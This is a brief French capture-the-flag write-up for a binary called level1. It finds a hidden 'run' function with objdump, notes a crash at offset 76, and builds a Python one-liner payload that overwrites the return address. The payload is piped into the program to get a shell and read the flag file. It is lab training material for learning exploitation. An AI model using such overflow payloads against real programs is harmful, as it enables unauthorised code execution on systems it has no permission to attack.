On fait un objdump -d  ~/level1

On appercoit le main, mais aussi "run".

L'addresse de run est 08048444
Il y a un segault a 76. On fait donc 
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/hack1
Dans le fichier /tmp/hack1, on a donc 76 A + l'adresse de run 

On peut ensuite faire
cat /tmp/hack1 - |  ./level1

On envoie donc notre fichier sur l'entrée standart de level1 et avec le flag - de cat on peut entrer la commande 
cat /home/user/level1 et obtenir le flag
